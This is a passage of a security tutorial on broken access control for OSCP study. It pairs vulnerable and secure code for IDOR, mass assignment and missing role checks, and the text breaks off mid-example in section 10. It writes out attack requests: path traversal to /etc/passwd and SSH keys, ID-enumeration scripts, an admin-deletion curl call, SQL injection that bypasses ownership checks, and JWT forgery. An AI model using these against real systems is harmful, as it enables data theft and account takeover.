
# Broken Access Control: The Silent Killer

## Table of Contents

1. [Executive Summary & OSCP Relevance](#1-executive-summary--oscp-relevance)
2. [ABSOLUTE BEGINNER: Access Control Fundamentals](#2-absolute-beginner-access-control-fundamentals)
3. [The Authentication vs Authorization Distinction](#3-the-authentication-vs-authorization-distinction)
4. [Types of Access Control Failures](#4-types-of-access-control-failures)
5. [Insecure Direct Object References (IDOR) - Deep Dive](#5-insecure-direct-object-references-idor---deep-dive)
6. [Missing Function Level Access Control](#6-missing-function-level-access-control)
7. [Parameter Tampering & Mass Assignment](#7-parameter-tampering--mass-assignment)
8. [Testing Methodology: The Three User Setup](#8-testing-methodology-the-three-user-setup)
9. [Advanced IDOR Techniques & Bypass Methods](#9-advanced-idor-techniques--bypass-methods)
10. [Privilege Escalation Chains](#10-privilege-escalation-chains)
11. [Automation: Burp Autorize & AutoRepeater](#11-automation-burp-autorize--autorepeater)
12. [Manual Testing Workflows](#12-manual-testing-workflows)
13. [API Security & Access Control](#13-api-security--access-control)
14. [GraphQL Access Control Issues](#14-graphql-access-control-issues)
15. [Business Logic Flaws](#15-business-logic-flaws)
16. [OSCP Attack Scenarios](#16-oscp-attack-scenarios)
17. [Defense Strategies](#17-defense-strategies)
18. [Common Pitfalls](#18-common-pitfalls)
19. [Hands-on Exercises](#19-hands-on-exercises)
20. [Interview Questions](#20-interview-questions)
21. [Summary & Key Takeaways](#21-summary--key-takeaways)
22. [References & Further Reading](#22-references--further-reading)

---

## 1. Executive Summary & OSCP Relevance

### What is Broken Access Control?

**Broken Access Control (BAC)** is the **#1 vulnerability** in the OWASP Top 10 (2021), dethroning Injection. Why? Because it:
- Cannot be easily detected by automated scanners
- Requires understanding **business logic** and **application context**
- Is present in **94%** of applications tested (OWASP data)
- Leads to complete data compromise

### OSCP Relevance (CRITICAL - 90%)

In the OSCP exam, you will encounter:
- **Web applications** with IDOR vulnerabilities (guaranteed 1-2 machines)
- **Admin panels** with missing access controls (privilege escalation paths)
- **API endpoints** that don't validate ownership
- **File download/upload** with path traversal + IDOR

**Real Exam Scenarios**:
- Exploit IDOR to read `/etc/passwd` via `GET /download?file=../../../../etc/passwd`
- Escalate from `user` to `admin` via parameter tampering
- Chain IDOR with LFI/RFI for remote code execution

**Time Allocation**: 15-30 minutes per machine to test for BAC

### Why This Matters

```
Traditional Security:           Modern Reality:
┌─────────────────┐            ┌─────────────────┐
│  Firewall   ✓   │            │  Firewall   ✓   │
│  IDS/IPS    ✓   │            │  IDS/IPS    ✓   │
│  Encryption ✓   │            │  Encryption ✓   │
│  Access Ctrl ✗  │ ← WEAK     │  Access Ctrl ✗  │ ← EXPLOITED
└─────────────────┘            └─────────────────┘
                                      ↓
                                Data Breach
```

---

## 2. ABSOLUTE BEGINNER: Access Control Fundamentals

### The Bouncer Analogy

Imagine a nightclub:

1. **Authentication** = Checking your ID at the door
   - "Are you who you say you are?"
   - "Show me your driver's license."

2. **Authorization** = Checking if you can enter VIP area
   - "Are you on the VIP list?"
   - "Your ID is valid, but you're not allowed in this area."

### The Problem

```
Real World (Secure):
┌──────────────────────────────────────┐
│ 1. User shows ID (Authentication)    │
│ 2. Bouncer checks VIP list (AuthZ)   │
│ 3. User enters if on list            │
└──────────────────────────────────────┘

Web Application (Insecure):
┌──────────────────────────────────────┐
│ 1. User logs in (Authentication) ✓   │
│ 2. Server TRUSTS user's request      │
│ 3. No ownership check (AuthZ) ✗      │
│ 4. User can access ANYONE'S data     │
└──────────────────────────────────────┘
```

### Simple Example

**Vulnerable Application**:
```
User A logs in → Gets cookie "session=abc123"
User A requests: GET /profile?user_id=100
Server responds: "Here's User 100's profile"

User A then requests: GET /profile?user_id=101
Server responds: "Here's User 101's profile" ← PROBLEM!
```

**The server never checked**: "Does User A own user_id=101?"

### ASCII Visualization

```
┌───────────────────────────────────────────────────────────┐
│                    IDOR Attack Flow                       │
└───────────────────────────────────────────────────────────┘

    Attacker (UserID: 5)              Server              Database
         │                              │                    │
         │ 1. Login as User 5           │                    │
         │─────────────────────────────→│                    │
         │                              │                    │
         │ 2. Session Cookie: abc123    │                    │
         │←─────────────────────────────│                    │
         │                              │                    │
         │ 3. GET /files/123            │                    │
         │    Cookie: abc123            │                    │
         │─────────────────────────────→│                    │
         │                              │                    │
         │                              │ 4. SELECT * FROM   │
         │                              │    files WHERE     │
         │                              │    id=123          │
         │                              │───────────────────→│
         │                              │                    │
         │                              │ 5. Returns file 123│
         │                              │←───────────────────│
         │                              │    (owned by User 7)
         │                              │                    │
         │ 6. 200 OK - File data        │                    │
         │←─────────────────────────────│                    │
         │    ← VULNERABLE!             │                    │
         │    Server didn't check       │                    │
         │    ownership!                │                    │
```

---

## 3. The Authentication vs Authorization Distinction

### Critical Difference

| Aspect | Authentication | Authorization |
|--------|---------------|---------------|
| **Question** | Who are you? | What can you do? |
| **Mechanism** | Username/Password, API Key, JWT | Permissions, Roles, Ownership |
| **Timing** | Once per session | Every request |
| **Example** | Login page | Access to specific resources |
| **OSCP Focus** | Credential stuffing, brute force | IDOR, privilege escalation |

### Code Example: The Difference

**Authentication Only (VULNERABLE)**:
```python
# User logs in
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        session['user_id'] = user.id  # Authentication successful
        return "Login successful"
    return "Invalid credentials", 401

# File download endpoint
@app.route('/download/<file_id>')
def download(file_id):
    # User is authenticated (has session cookie)
    # But NO authorization check!
    file = File.query.get(file_id)
    return send_file(file.path)  # ← VULNERABLE!
```

**With Proper Authorization (SECURE)**:
```python
@app.route('/download/<file_id>')
def download(file_id):
    # 1. Authentication check
    if 'user_id' not in session:
        return "Not authenticated", 401
    
    # 2. Get the file
    file = File.query.get(file_id)
    if not file:
        return "File not found", 404
    
    # 3. AUTHORIZATION CHECK
    if file.owner_id != session['user_id']:
        return "Forbidden", 403  # ← SECURE!
    
    return send_file(file.path)
```

### Real-World Example: Facebook Photo Access

**Scenario**: Facebook has billions of photos. Each photo has a unique ID.

**Vulnerable Implementation**:
```
https://facebook.com/photo/view?id=123456789
```
If Facebook only checked "Is the user logged in?" but not "Does this user have permission to view photo 123456789?", anyone could view private photos by changing the ID.

**Secure Implementation**:
```python
# Pseudocode
def view_photo(photo_id):
    photo = get_photo(photo_id)
    
    # Check if user can view this photo
    if not (photo.is_public() or 
            photo.owner == current_user or 
            photo.shared_with(current_user)):
        return 403
    
    return photo.data
```

---

## 4. Types of Access Control Failures

### 4.1 Horizontal Privilege Escalation (IDOR)

**Definition**: Accessing resources of **same privilege level** but belonging to **another user**.

```
Users:          User A (ID: 100) ←→ User B (ID: 101)
                   ↑                    ↑
Privilege:      [Customer]          [Customer]
                   Same Level
                   
Attack: User A accesses User B's invoice
```

**Examples**:
- `GET /api/invoices/500` → Change to `/api/invoices/501` (another customer's invoice)
- `POST /api/messages` with `recipient_id=200` → Read messages meant for User 200
- `GET /download?file=report_alice.pdf` → Change to `report_bob.pdf`

### 4.2 Vertical Privilege Escalation

**Definition**: Accessing resources of **higher privilege level**.

```
Users:          User (ID: 100)  →  Admin (ID: 1)
                   ↑                    ↑
Privilege:      [Customer]          [Administrator]
                   Lower              Higher
                   
Attack: User accesses admin functions
```

**Examples**:
- `POST /admin/users/delete` (admin endpoint accessible by regular user)
- Parameter tampering: `role=admin` in user profile update
- API endpoint: `GET /api/admin/logs` (no role check)

### 4.3 Context-Dependent Access Control

**Definition**: Access depends on **application state** or **workflow**.

**Example: Shopping Cart**
```
Normal Flow:
1. Add items to cart
2. Checkout (pay)
3. Order confirmed
4. Download receipt

Attack:
1. Add items to cart
2. Skip checkout (don't pay)
3. Download receipt directly: GET /receipts/12345
```

### 4.4 Missing Function Level Access Control

**Definition**: API endpoints exist but lack permission checks.

```
Frontend:          Backend API:
┌─────────────┐    ┌──────────────────┐
│ User View   │    │ GET /api/users   │ ← Unprotected
│             │    │ POST /api/delete │ ← Unprotected
│ [Profile]   │    │ PUT /api/promote │ ← Unprotected
│             │    └──────────────────┘
└─────────────┘
     ↑
Developer thinks: "UI doesn't show admin buttons to users,
                   so they won't find the endpoints."
     
Reality: Attackers use Burp/ZAP to discover all endpoints!
```

### 4.5 Insecure Direct Object References (IDOR)

**Definition**: Exposing internal implementation (database IDs, file paths) without authorization.

**Vulnerable Patterns**:
```
1. Sequential IDs:     /user/profile/101, 102, 103...
2. Predictable names:  /files/invoice_january.pdf
3. GUIDs in URLs:      /api/orders/550e8400-e29b-41d4-a716-446655440000
4. Path traversal:     /download?file=../../../etc/passwd
```

---

## 5. Insecure Direct Object References (IDOR) - Deep Dive

### 5.1 What is IDOR?

**IDOR** = The server exposes a reference to an internal object (file, database record, user) and trusts the client not to tamper with it.

### 5.2 IDOR in Different Contexts

#### A. Database Record IDOR

**Scenario**: Social media site where users have private messages.

**Vulnerable Code**:
```php
// PHP example
<?php
session_start();
$msg_id = $_GET['id'];  // User provides ID

// NO OWNERSHIP CHECK!
$result = mysqli_query($conn, "SELECT * FROM messages WHERE id=$msg_id");
$message = mysqli_fetch_assoc($result);

echo $message['content'];
?>
```

**Attack**:
```bash
# Normal request (User A reading their own message)
GET /message.php?id=100 HTTP/1.1
Cookie: session=abc123

# Attack (User A reading User B's message)
GET /message.php?id=200 HTTP/1.1
Cookie: session=abc123  # Still authenticated as User A
```

**Secure Code**:
```php
<?php
session_start();
$msg_id = $_GET['id'];
$user_id = $_SESSION['user_id'];

// WITH OWNERSHIP CHECK
$stmt = $conn->prepare("SELECT * FROM messages WHERE id=? AND recipient_id=?");
$stmt->bind_param("ii", $msg_id, $user_id);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows === 0) {
    http_response_code(403);
    die("Access denied");
}

$message = $result->fetch_assoc();
echo $message['content'];
?>
```

#### B. File Path IDOR

**Scenario**: Document management system.

**Vulnerable Code**:
```python
from flask import Flask, send_file

@app.route('/download')
def download():
    filename = request.args.get('file')
    # DANGEROUS: No validation!
    return send_file(f'/var/uploads/{filename}')
```

**Attack**:
```bash
# Normal request
GET /download?file=report_2024.pdf

# Path traversal attack
GET /download?file=../../../../etc/passwd
GET /download?file=../../../../var/www/config.php
GET /download?file=../../../../home/admin/.ssh/id_rsa
```

**Secure Code**:
```python
import os
from flask import Flask, send_file, abort

UPLOAD_DIR = '/var/uploads/'

@app.route('/download')
def download():
    filename = request.args.get('file')
    
    # 1. Sanitize filename (prevent path traversal)
    filename = os.path.basename(filename)
    
    # 2. Construct full path
    filepath = os.path.join(UPLOAD_DIR, filename)
    
    # 3. Verify path is within allowed directory
    if not os.path.abspath(filepath).startswith(UPLOAD_DIR):
        abort(403)
    
    # 4. Check ownership
    file_owner = get_file_owner(filepath)  # Custom function
    if file_owner != current_user.id:
        abort(403)
    
    return send_file(filepath)
```

#### C. API IDOR

**Scenario**: RESTful API for e-commerce.

**Vulnerable Endpoint**:
```
GET /api/orders/12345 HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Response:
{
  "order_id": 12345,
  "total": 299.99,
  "items": [...],
  "shipping_address": "123 Victim St"
}
```

**Attack**:
```bash
# Enumerate all orders
for i in $(seq 12000 13000); do
    curl -H "Authorization: Bearer TOKEN" \
         "https://api.shop.com/orders/$i" \
         -o "order_$i.json"
done

# Result: Downloaded 1,000 orders from other customers!
```

**Secure Implementation**:
```javascript
// Node.js + Express
app.get('/api/orders/:order_id', authenticateToken, async (req, res) => {
    const orderId = req.params.order_id;
    const userId = req.user.id;  // From JWT
    
    // Fetch order with ownership check in the query
    const order = await db.query(
        'SELECT * FROM orders WHERE id = $1 AND user_id = $2',
        [orderId, userId]
    );
    
    if (order.rows.length === 0) {
        return res.status(404).json({ error: 'Order not found' });
    }
    
    res.json(order.rows[0]);
});
```

### 5.3 IDOR with Different ID Types

#### Sequential Integers

**Example**: `user_id=1, 2, 3, 4, 5...`

**Pros (for attacker)**:
- Easy to enumerate
- Predictable
- Fast to brute force

**Attack**:
```python
import requests

for user_id in range(1, 10000):
    r = requests.get(f'https://target.com/api/users/{user_id}',
                     cookies={'session': 'attacker_session'})
    if r.status_code == 200:
        print(f"User {user_id}: {r.json()}")
```

#### UUIDs/GUIDs

**Example**: `user_id=550e8400-e29b-41d4-a716-446655440000`

**Attacker Challenge**:
- 128-bit random number = 2^128 possibilities
- Impossible to brute force

**BUT... UUIDs leak!**

**Common Leak Vectors**:
```
1. API Responses:
   GET /api/profile
   Response: {
       "id": "550e8400-e29b-41d4-a716-446655440000",
       "friends": [
           {"id": "7c9e6679-7425-40de-944b-e07fc1f90ae7"},  ← Leaked!
           {"id": "8f14e45f-ceea-467a-9af8-4c4df0a45e8c"}   ← Leaked!
       ]
   }

2. Public Profiles:
   https://site.com/user/550e8400-e29b-41d4-a716-446655440000
   
3. Shared Links:
   "Share this document: https://docs.com/view/8f14e45f-ceea-467a..."

4. Error Messages:
   "User 7c9e6679-7425-40de-944b-e07fc1f90ae7 not found"

5. Email Headers:
   X-User-ID: 550e8400-e29b-41d4-a716-446655440000
```

**Attack Workflow**:
```bash
# Step 1: Collect leaked UUIDs
grep -r "uuid" burp_proxy_history.xml > leaked_uuids.txt

# Step 2: Test each UUID
while read uuid; do
    curl -s "https://target.com/api/users/$uuid" \
         -H "Cookie: session=attacker" \
         -o "user_$uuid.json"
done < leaked_uuids.txt
```

#### Hashed IDs

**Example**: `file_id=5d41402abc4b2a76b9719d911017c592` (MD5 hash)

**Weak Hash Example**:
```python
# Vulnerable hashing
file_id = md5(str(numeric_id))

# Attack: Rainbow table or brute force
for i in range(1, 100000):
    if md5(str(i)) == '5d41402abc4b2a76b9719d911017c592':
        print(f"Original ID: {i}")
```

**Secure Implementation**:
```python
import hmac
import hashlib
import secrets

# Server-side secret (never expose)
SECRET_KEY = secrets.token_bytes(32)

def create_secure_id(numeric_id):
    # HMAC with secret key
    return hmac.new(SECRET_KEY, str(numeric_id).encode(), hashlib.sha256).hexdigest()

def verify_and_decode_id(secure_id, numeric_id):
    expected = create_secure_id(numeric_id)
    return hmac.compare_digest(expected, secure_id)
```

### 5.4 IDOR in JSON Bodies

Sometimes the object reference is hidden in the request body, not the URL.

**Example**:
```http
POST /api/profile/update HTTP/1.1
Content-Type: application/json

{
  "user_id": 100,
  "email": "new@email.com"
}
```

**Attack**:
```http
POST /api/profile/update HTTP/1.1
Content-Type: application/json

{
  "user_id": 200,  ← Changed to victim's ID
  "email": "attacker@evil.com"
}
```

**Result**: If the server trusts the `user_id` in the JSON body, the attacker just changed the victim's email!

**Secure Implementation**:
```javascript
app.post('/api/profile/update', authenticateToken, (req, res) => {
    // NEVER trust user_id from request body!
    // Use authenticated user from session/JWT
    const userId = req.user.id;  // From authentication middleware
    
    db.query('UPDATE users SET email = $1 WHERE id = $2',
             [req.body.email, userId]);  // Use userId from auth, not request
});
```

---

## 6. Missing Function Level Access Control

### 6.1 The Hidden Endpoint Problem

**Scenario**: Developer creates admin panel with endpoints `/admin/users`, `/admin/delete`, `/admin/promote`.

**Flawed Security Model**:
```
Developer's Assumption:
"I'll hide the admin links in the UI. Regular users won't see them,
 so they won't know the endpoints exist."
 
Reality:
- Burp Suite's Spider crawls JavaScript and finds endpoints
- Attackers use wordlists: /admin, /api/admin, /administrator
- JavaScript source code reveals API calls
```

### 6.2 Real-World Example

**Vulnerable Application**:
```javascript
// Frontend React code (visible to all users)
function AdminPanel() {
    // Only shown if user.role === 'admin'
    return (
        <div>
            <button onClick={() => fetch('/api/admin/delete_user', {...})}>
                Delete User
            </button>
        </div>
    );
}

// Backend API (NO ROLE CHECK!)
app.post('/api/admin/delete_user', (req, res) => {
    const userId = req.body.user_id;
    db.query('DELETE FROM users WHERE id = ?', [userId]);
    res.json({ success: true });
});
```

**Attack**:
```bash
# Attacker opens DevTools, reads React source code
# Finds: fetch('/api/admin/delete_user', ...)
# Tests the endpoint directly

curl -X POST https://target.com/api/admin/delete_user \
     -H "Content-Type: application/json" \
     -H "Cookie: session=regular_user_session" \
     -d '{"user_id": 1}'  # Admin user ID

# Result: Admin user deleted! Regular user performed admin action.
```

### 6.3 HTTP Method Tampering

**Concept**: Developer only protects one HTTP method, forgetting others.

**Example**:
```python
# Developer protects GET
@app.route('/admin/users', methods=['GET'])
@require_admin
def list_users():
    return render_template('users.html')

# But forgets to protect POST/PUT/DELETE!
@app.route('/admin/users', methods=['POST'])
def create_user():  # NO @require_admin decorator!
    username = request.form['username']
    role = request.form['role']
    db.create_user(username, role)
```

**Attack Vectors**:
```bash
# 1. GET blocked → Try POST
GET /admin/users → 403 Forbidden
POST /admin/users → 200 OK (Vulnerable!)

# 2. POST blocked → Try PUT
POST /api/user/123 → 403
PUT /api/user/123 → 200 OK

# 3. Try HEAD (returns headers without body)
GET /admin/config → 403
HEAD /admin/config → 200 OK
  Response headers might leak info

# 4. Try OPTIONS (reveals allowed methods)
OPTIONS /api/admin → 200 OK
  Allow: GET, POST, PUT, DELETE
```

**Burp Suite Test**:
```
1. Send request to Repeater
2. Right-click → Change request method
3. Test: GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS
4. Note which ones return 200 without proper authorization
```

### 6.4 Endpoint Discovery Techniques

#### A. JavaScript Analysis

```bash
# Download all JS files
wget -r -l1 -H -D target.com -A.js https://target.com

# Search for API endpoints
grep -r "fetch(" *.js
grep -r "axios.post" *.js
grep -r "/api/" *.js

# Extract unique endpoints
grep -oP '(?<=fetch\(")[^"]+' *.js | sort -u > endpoints.txt
```

#### B. Burp Suite Sitemap

```
1. Browse the app (logged in as regular user)
2. Burp → Target → Site map
3. Right-click → Engagement tools → Find scripts
4. Analyze all .js files for hidden endpoints
```

#### C. Wordlist Fuzzing

```bash
# Use ffuf to discover admin endpoints
ffuf -u https://target.com/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -H "Cookie: session=user_session" \
     -mc 200,204,301,302,307,401,403

# Common admin paths
/admin
/administrator
/api/admin
/api/v1/admin
/admin/panel
/admin/dashboard
/admin_panel
/controlpanel
/moderator
/backend
```

### 6.5 Case Study: Tesla IDOR (2020)

**Vulnerability**: Tesla's customer portal had IDOR in vehicle management.

**Attack**:
```
1. Attacker logs in, sees their vehicle: GET /api/vehicles/ATTACKER_VIN
2. Changes VIN to victim's: GET /api/vehicles/VICTIM_VIN
3. API returns victim's vehicle data (location, mileage, etc.)
4. Worse: POST /api/vehicles/VICTIM_VIN/unlock
   → Attacker unlocked victim's Tesla remotely!
```

**Root Cause**:
- VIN (Vehicle Identification Number) was used as direct reference
- No check if authenticated user owns that VIN

**Bounty**: $50,000+ payout

---

## 7. Parameter Tampering & Mass Assignment

### 7.1 What is Mass Assignment?

**Definition**: Automatically binding HTTP request parameters to internal object fields.

**The Problem**: If not properly controlled, attackers can set fields they shouldn't have access to.

### 7.2 Vulnerable Frameworks

**Ruby on Rails**:
```ruby
# Vulnerable code
def create
  @user = User.new(params[:user])  # Mass assignment!
  @user.save
end

# Attack:
# POST /users
# user[name]=Bob&user[email]=bob@example.com&user[role]=admin&user[is_verified]=true
```

**Node.js / Express**:
```javascript
// Vulnerable
app.post('/register', (req, res) => {
    const user = new User(req.body);  // All fields from request!
    user.save();
});

// Attack:
// { "username": "bob", "password": "123", "role": "admin", "balance": 1000000 }
```

**PHP Laravel**:
```php
// Vulnerable
public function store(Request $request) {
    User::create($request->all());  // Mass assignment
}
```

**Python Django**:
```python
# Vulnerable
def create_user(request):
    user = User.objects.create(**request.POST.dict())
```

### 7.3 Attack Examples

#### Example 1: Privilege Escalation via Role

**Normal Registration**:
```http
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "bob",
  "email": "bob@example.com",
  "password": "SecurePass123"
}
```

**Attack (Mass Assignment)**:
```http
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "bob",
  "email": "bob@example.com",
  "password": "SecurePass123",
  "role": "admin",           ← Added
  "is_verified": true,       ← Added
  "account_balance": 1000000 ← Added
}
```

**Result**: If the backend does `User.create(request_data)` without filtering, Bob becomes an admin with $1M balance!

#### Example 2: Price Manipulation

**Normal Checkout**:
```http
POST /api/checkout HTTP/1.1

{
  "cart_items": [
    {"product_id": 123, "quantity": 2}
  ]
}
```

**Attack**:
```http
POST /api/checkout HTTP/1.1

{
  "cart_items": [
    {"product_id": 123, "quantity": 2, "price": 0.01}  ← Price override!
  ],
  "discount": 99.99,  ← Added
  "total": 0.01       ← Added
}
```

**Result**: If the server uses client-supplied `price` or `total`, attacker pays $0.01 for a $100 item.

#### Example 3: Account Takeover

**Profile Update**:
```http
PUT /api/profile HTTP/1.1

{
  "display_name": "Bobby",
  "email": "attacker@evil.com",  ← Legitimate change
  "user_id": 9999                ← ADDED: Victim's user_id
}
```

**Result**: If server does `update_user(request_data)`, attacker changes victim's email to their own, enabling password reset takeover.

### 7.4 Defense: Allowlisting

**Secure Implementations**:

**Ruby on Rails**:
```ruby
# Secure: Strong parameters
def create
  @user = User.new(user_params)
  @user.save
end

private
def user_params
  params.require(:user).permit(:name, :email, :password)  # Only these fields
end
```

**Node.js**:
```javascript
// Secure: Explicit field selection
app.post('/register', (req, res) => {
    const user = new User({
        username: req.body.username,
        email: req.body.email,
        password: req.body.password
        // role, is_verified NOT included
    });
    user.save();
});
```

**Python Django**:
```python
# Secure: Explicit fields
def create_user(request):
    user = User.objects.create(
        username=request.POST['username'],
        email=request.POST['email'],
        password=make_password(request.POST['password'])
        # No role, is_verified, etc.
    )
```

**PHP Laravel**:
```php
// Model definition with $fillable
class User extends Model {
    protected $fillable = ['name', 'email', 'password'];  // Allowlist
    protected $guarded = ['role', 'is_admin'];            // Denylist
}
```

### 7.5 Testing for Mass Assignment

**Manual Testing**:
```bash
# Step 1: Capture a legitimate request
POST /api/users
{"name": "Alice", "email": "alice@example.com"}

# Step 2: Inspect the database schema or guess common fields
# Common injectable fields: role, is_admin, is_verified, balance, credits

# Step 3: Add fields one by one
POST /api/users
{"name": "Alice", "email": "alice@example.com", "role": "admin"}

# Step 4: Check if the field was set
GET /api/users/me
Response: {"name": "Alice", "role": "admin"}  ← Success!
```

**Automated (Burp Suite)**:
```
1. Install "Param Miner" extension
2. Send request to Intruder
3. Attack type: Sniper
4. Payload: Common field names
   - role
   - is_admin
   - is_verified
   - admin
   - privileged
   - balance
   - credits
5. Analyze responses for behavior changes
```

---

## 8. Testing Methodology: The Three User Setup

### 8.1 Why Three Users?

To properly test access control, you need different privilege levels and ownership contexts.

```
User A (Attacker)   User B (Victim)    Admin User
     ↓                    ↓                 ↓
  Low Priv            Low Priv          High Priv
  (same level)        (same level)      (elevated)
       ↓                   ↓                 ↓
  Test horizontal     Test horizontal   Test vertical
  escalation to B     escalation to A   escalation
```

### 8.2 Setup Instructions

**Step 1: Create Accounts**
```bash
# User A (Attacker)
curl -X POST https://target.com/register \
  -d "username=attacker&email=attacker@test.com&password=Pass123"

# User B (Victim)
curl -X POST https://target.com/register \
  -d "username=victim&email=victim@test.com&password=Pass123"

# Admin (if allowed to register)
# Otherwise, use provided credentials or create via SQL injection
```

**Step 2: Login and Save Sessions**
```bash
# Login as User A
curl -X POST https://target.com/login \
  -d "username=attacker&password=Pass123" \
  -c cookies_a.txt

# Login as User B
curl -X POST https://target.com/login \
  -d "username=victim&password=Pass123" \
  -c cookies_b.txt

# Login as Admin
curl -X POST https://target.com/login \
  -d "username=admin&password=admin123" \
  -c cookies_admin.txt
```

**Step 3: Create Resources**
```bash
# As User B, create a private document
curl -X POST https://target.com/api/documents \
  -b cookies_b.txt \
  -d "title=Secret Document&content=Confidential data"

# Response: {"id": 555, "title": "Secret Document"}
```

**Step 4: Test Access Control**
```bash
# As User A, try to access User B's document
curl https://target.com/api/documents/555 \
  -b cookies_a.txt

# Expected: 403 Forbidden
# Vulnerable: 200 OK (IDOR!)
```

### 8.3 Testing Checklist

#### Horizontal Escalation (User A → User B)

- [ ] User profiles: `GET /users/{user_b_id}`
- [ ] Private messages: `GET /messages/{message_b_id}`
- [ ] Documents/files: `GET /files/{file_b_id}`
- [ ] Orders/invoices: `GET /orders/{order_b_id}`
- [ ] API tokens: `GET /api/tokens/{token_b_id}`
- [ ] Settings: `PUT /settings/{user_b_id}`
- [ ] Delete actions: `DELETE /posts/{post_b_id}`

#### Vertical Escalation (User A → Admin)

- [ ] Admin panel: `GET /admin`, `/administrator`, `/admin/dashboard`
- [ ] User management: `POST /admin/users/delete`, `GET /admin/users`
- [ ] System settings: `GET /admin/settings`, `PUT /admin/config`
- [ ] Logs/monitoring: `GET /admin/logs`, `GET /admin/stats`
- [ ] Promotion: `POST /admin/users/{user_a_id}/promote`
- [ ] Role change: `PUT /users/{user_a_id}` with `{"role": "admin"}`

#### Function-Level Access

- [ ] Test all HTTP methods: GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS
- [ ] Hidden endpoints: `/api/v1/admin`, `/api/internal`
- [ ] API documentation: `/swagger`, `/api-docs`, `/graphql`

### 8.4 Burp Suite Workflow

**Configuration**:
```
1. Proxy → Options → Match and Replace
   - Add rule: Replace "session=USER_A_SESSION" with "session=USER_B_SESSION"
   
2. Or use Autorize extension:
   - Install from BApp Store
   - Configuration → Set Low-Privilege User session
   - Browse as Admin
   - Autorize replays each request with Low-Priv session
```

**Testing Process**:
```
1. Browse as User B, perform actions (create document, view profile)
2. Copy all requests from Proxy History
3. Right-click → Send to Repeater
4. Replace session cookie with User A's cookie
5. Send request
6. Analyze response:
   - 200 OK = VULNERABLE
   - 403/401 = Secure
   - 404 = Possibly secure (obscurity)
```

---

## 9. Advanced IDOR Techniques & Bypass Methods

### 9.1 Encoded IDs

Sometimes IDs are encoded to "hide" them.

**Base64 Encoding**:
```bash
# Original: user_id=123
# Encoded: dXNlcl9pZD0xMjM=

# Attack
echo "dXNlcl9pZD0xMjM=" | base64 -d
# Output: user_id=123

# Change to 124
echo "user_id=124" | base64
# Output: dXNlcl9pZD0xMjQ=

# Send: GET /api/profile?id=dXNlcl9pZD0xMjQ=
```

**Hex Encoding**:
```bash
# Original: 123
# Hex: 0x7B

# Attack
python3 -c "print(hex(124))"  # 0x7c
```

**JWT Tokens (Insecure)**:
```bash
# JWT payload might contain:
{
  "user_id": 123,
  "role": "user"
}

# Decode JWT (jwt.io or jwt-cli)
jwt decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Change user_id to 124, role to "admin"
# Re-sign with weak key or "none" algorithm
```

### 9.2 Array-Based IDOR

**Vulnerable Endpoint**:
```http
POST /api/delete_messages HTTP/1.1
Content-Type: application/json

{
  "message_ids": [10, 11, 12]
}
```

**Attack (Add victim's message IDs)**:
```http
POST /api/delete_messages HTTP/1.1

{
  "message_ids": [10, 11, 12, 500, 501, 502]
}
```

**Result**: If the server doesn't validate ownership of EACH message ID, it deletes the victim's messages too!

### 9.3 Wildcard IDOR

**Example**:
```bash
# Delete all MY messages
DELETE /api/messages/mine

# What if we try:
DELETE /api/messages/all  ← Deletes everyone's messages?
DELETE /api/messages/*    ← Wildcard injection?
```

### 9.4 Numeric ID Manipulation

**Negative Numbers**:
```bash
GET /api/users/123      → User 123's profile
GET /api/users/-1       → Might return admin (ID -1)?
GET /api/users/0        → System user?
```

**Overflow**:
```bash
GET /api/users/2147483647   → Max int
GET /api/users/2147483648   → Overflow to negative?
```

**Float/Decimal**:
```bash
GET /api/users/123      → User 123
GET /api/users/123.5    → Error? Or rounds to 123/124?
```

### 9.5 SQL Injection + IDOR

**Concept**: Combine IDOR with SQL injection to bypass ownership checks.

**Vulnerable Code**:
```python
user_id = session['user_id']
requested_id = request.args.get('id')

# Vulnerable query
query = f"SELECT * FROM files WHERE id={requested_id} AND owner_id={user_id}"
```

**Attack**:
```bash
# Normal IDOR (blocked by owner_id check)
GET /files?id=999

# SQLi + IDOR
GET /files?id=999 OR 1=1--

# Resulting query:
# SELECT * FROM files WHERE id=999 OR 1=1-- AND owner_id=5
# The -- comments out the owner_id check!
```

### 9.6 Race Conditions

**Scenario**: Time-of-check vs time-of-use.

**Attack Flow**:
```bash
# Step 1: User has 1 credit for file download
# Step 2: Attacker sends 10 simultaneous requests

for i in {1..10}; do
  curl https://target.com/download?file_id=premium.pdf \
       -b "session=attacker" &
done

# If the server doesn't use proper locking:
# 1. Thread 1 checks credits (1 credit) → OK
# 2. Thread 2 checks credits (1 credit) → OK (not decremented yet)
# 3. Both threads download file
# 4. Credits decremented twice → -1 credits
# Result: Downloaded 2 files with 1 credit
```

### 9.7 Blind IDOR

**Definition**: No direct response, but action still happens.

**Example**:
```bash
# Password reset
POST /api/reset_password
{"email": "victim@example.com"}

# Server response: "If email exists, reset link sent"
# No way to know if it worked... or is there?

# Blind confirmation methods:
1. Check victim's spam folder (social engineering)
2. Timing attack (email exists → slower response)
3. Side-channel (victim's session logged out?)
```

---

## 10. Privilege Escalation Chains

### 10.1 IDOR → Account Takeover

**Attack Chain**:
```
1. IDOR to read victim's email
   GET /api/users/999 → {"email": "victim@example.com"}

2. Password reset with victim's email
   POST /api/reset_password {"email": "victim@example.com"}

3. IDOR to read victim's reset token
   GET /api/reset_tokens?user_id=999 → {"token": "abc123"}

4. Use token to reset password
   POST /api/reset_password/confirm {"token": "abc123", "new_password": "hacked"}

5. Login as victim
```

### 10.2 IDOR → Privilege Escalation

**Attack Chain**:
```
1. IDOR to read admin's API token
   GET /api/tokens/admin_id → {"api_token": "xyz789"}

2. Use admin token to promote self
   PUT /api/users/attacker_id
   Headers: Authorization: Bearer xyz789
   Body: {"role": "admin"}

3. Now attacker is admin
```

### 10.3 Mass Assignment → Admin

**Attack**:
```http
PUT /api/profile HTTP/1.1
Content-Type: application/json
Cookie: session=attacker_session

{
  "display_name": "Hacker",
  "role": "administrator",
